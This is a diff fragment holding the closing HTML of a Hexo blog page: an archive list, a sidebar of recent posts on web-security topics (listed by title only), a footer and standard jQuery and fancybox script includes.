+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
